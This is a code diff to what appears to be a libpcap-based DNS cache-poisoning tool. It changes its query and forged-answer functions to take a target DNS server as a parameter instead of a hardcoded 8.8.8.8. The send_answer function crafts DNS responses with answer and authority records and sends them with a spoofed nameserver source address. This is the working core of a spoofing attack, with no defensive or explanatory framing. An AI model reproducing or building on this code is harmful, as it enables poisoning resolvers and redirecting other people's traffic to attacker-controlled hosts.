@@ -39,11 +39,9 @@ bool sendDgram(pcap_t* handle, uint8_t* from, uint8_t* to, uint16_t fromport, ui
 	return (pcap_sendpacket(handle, pkt, sizeof ether_header + sizeof ip_hdr + sizeof udp_hdr + sz) != -1);
 }
 
-bool send_question(pcap_t* handle, string target, uint8_t* gateway) {
+bool send_question(pcap_t* handle, uint8_t* dnssvr, string target, uint8_t* gateway) {
 	u_char pkt[200];
 	dns_hdr* dns = (dns_hdr*)pkt;
-
-	uint8_t google[4] = { 8, 8, 8, 8 };
 
 	dns->tid = htons(rand());
 	dns->flags = htons(0x0100);
@@ -58,17 +56,15 @@ bool send_question(pcap_t* handle, string target, uint8_t* gateway) {
 	memset(&pkt[sizeof dns_hdr + target.length() + 2], 0x00, 1);
 	memset(&pkt[sizeof dns_hdr + target.length() + 3], 0x01, 1);
 
-	return sendDgram(handle, NULL, google, 5000 + rand() / 8, 53, pkt, sizeof dns_hdr + target.length() + 4, gateway);
+	return sendDgram(handle, NULL, dnssvr, 5000 + rand() / 8, 53, pkt, sizeof dns_hdr + target.length() + 4, gateway);
 }
 
-bool send_answer(pcap_t* handle, string target, string s_targetns, uint8_t* targetns, uint8_t* ndest, uint8_t* gateway, uint16_t tid) {
+bool send_answer(pcap_t* handle, uint8_t* dnssvr, string target, string s_targetns, uint8_t* targetns, uint8_t* ndest, uint8_t* gateway, uint16_t tid) {
 	u_char pkt[200];
 	dns_hdr* dns = (dns_hdr*)pkt;
 	dns_rcrd* record = (dns_rcrd*)&pkt[sizeof dns_hdr + target.length() * 2 + 4];
 	dns_rcrd* auth = (dns_rcrd*)&pkt[sizeof dns_hdr + target.length() * 3 + 18];
 	int sz = 0;
-
-	uint8_t google[4] = { 8, 8, 8, 8 };
 
 	dns->tid = htons(tid);
 	dns->flags = htons(0x8400);
@@ -101,5 +97,5 @@ bool send_answer(pcap_t* handle, string target, string s_targetns, uint8_t* targ
 	memcpy(&pkt[sz + target.length() + 10], s_targetns.c_str(), s_targetns.length());
 	sz += target.length() + s_targetns.length() + 10;
 
-	return sendDgram(handle, targetns, google, 53, 53, pkt, sz, gateway);
+	return sendDgram(handle, targetns, dnssvr, 53, 53, pkt, sz, gateway);
 }
